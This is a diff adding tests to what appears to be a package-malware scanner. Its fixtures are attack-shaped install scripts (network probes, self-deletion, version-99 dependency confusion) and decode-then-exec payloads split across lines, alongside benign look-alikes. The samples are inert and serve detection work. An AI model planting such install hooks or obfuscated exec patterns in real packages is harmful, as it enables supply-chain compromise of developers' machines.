@@ -92,6 +92,48 @@ test("malware patterns", async () => {
   for (const id of ["mal-eval-decoded", "mal-download-exec", "mal-exfil-endpoint", "mal-env-exfil", "mal-credential-paths", "mal-charcode-blob", "setup-py-runs-code", "mal-py-exec-decoded", "mal-reverse-shell", "mal-obfuscator", "mal-bidi-chars"]) assert.ok(rules(r).has(id), id);
 });
 
+test("install scripts shaped like attacks: probes, hidden files, self-deletion, version 99", async () => {
+  const pkg = (name, version, scripts) => JSON.stringify({ name, version, scripts });
+  const cases = {
+    "install-time-network": { "package.json": pkg("acme-billing-sdk", "1.0.0", { preinstall: "node app.js" }), "app.js": "const http = require('http');\nhttp.get('http://acme-billing-sdk.probe.example');\n" },
+    "install-runs-non-code": { "package.json": pkg("twing22", "1.0.0", { preinstall: "node lib/README.md" }), "lib/README.md": "# hi\n" },
+    "install-self-delete": { "package.json": pkg("chainflow", "5.0.5", { preinstall: "node index.js && del index.js" }), "index.js": "console.log(1)\n" },
+    "install-fetches-packages": { "package.json": pkg("add-salt", "1.0.6", { preinstall: "npm install axios dotenv" }) },
+    "install-background": { "package.json": pkg("redis-v9", "6.0.7", { preinstall: "node ./scripts/init.js &" }), "scripts/init.js": "console.log(1)\n" },
+    "dep-confusion-version": { "package.json": pkg("indrive-web", "99.4.1", { preinstall: "node index.js" }), "index.js": "console.log(1)\n" },
+  };
+  for (const [id, files] of Object.entries(cases)) assert.ok(rules(await run(project(files), { noIgnore: true })).has(id), id);
+
+  const ok = await run(project({
+    "package.json": pkg("esbuild", "0.24.0", { postinstall: "node install.js" }), "install.js": "require('https').get('https://registry.npmjs.org/@esbuild/darwin-arm64');\n",
+    "app/package.json": JSON.stringify({ name: "my-app", private: true, version: "1.0.0", scripts: { postinstall: "node setup.js && npm run build" } }), "app/setup.js": "fetch('https://api.example.com/schema');\n",
+    "lib/package.json": pkg("number-magic", "1.3.6", { prepare: "npm run build", postinstall: "husky install" }),
+  }), { noIgnore: true });
+  assert.deepEqual(ok.findings.filter(f => /^install-|^dep-confusion/.test(f.rule) && f.severity !== "info").map(f => `${f.rule} ${f.file}`), []);
+});
+
+test("payloads decoded on one line and run on another; names glued from pieces", async () => {
+  const bad = project({
+    "tool.py": j("import base64\npayload = 'cHJpbnQoMSk='\ndecoded = base64.b64", "decode(payload).decode()\nex", "ec(decoded)\n"),
+    "two.py": j("import zlib\nraw = zlib.decom", "press(blob)\ncode = raw.decode('utf-8')\nev", "al(code)\n"),
+    "load.js": j("const buf = Buffer.from(data, 'base", "64');\nconst src = buf.toString();\nnew Func", "tion(src)();\n"),
+    "glue.py": `cmd = "e" + "v" + "a" + "l"\n`,
+    "glue2.py": `name = "".join(["__im", "po", "rt__"])\n`,
+  });
+  const r = await run(bad, { noIgnore: true });
+  const by = id => new Set(r.findings.filter(f => f.rule === id).map(f => f.file));
+  assert.deepEqual([...by("mal-decode-then-run")].sort(), ["load.js", "tool.py", "two.py"]);
+  assert.deepEqual([...by("mal-split-builtin")].sort(), ["glue.py", "glue2.py"]);
+
+  const good = project({
+    "img.py": "import base64\ndata = base64.b64decode(s)\nopen('out.png', 'wb').write(data)\npattern = re.compile(rx)\n",
+    "rx.js": "const raw = atob(s);\nconst m = re.exec(raw);\nconst label = 'ab' + 'cd' + 'ef';\n",
+    "cfg.py": "text = base64.b64decode(blob).decode()\nconfig = json.loads(text)\nresult = eval(expr)\n",
+  });
+  const g = await run(good, { noIgnore: true });
+  assert.deepEqual(g.findings.filter(f => ["mal-decode-then-run", "mal-split-builtin"].includes(f.rule)).map(f => f.file), []);
+});
+
 test("supply chain: install scripts, typosquats, sources, workflows, MCP, VS Code", async () => {
   const dir = project({
     "package.json": JSON.stringify({ name: "app", scripts: { postinstall: j("node -e \"require('https').get('https://x.example/a", ".js')\"") }, dependencies: { expresss: "^1.0.0", "@angullar/core": "^1.0.0", lodash: "*", mylib: "github:someone/mylib" } }),
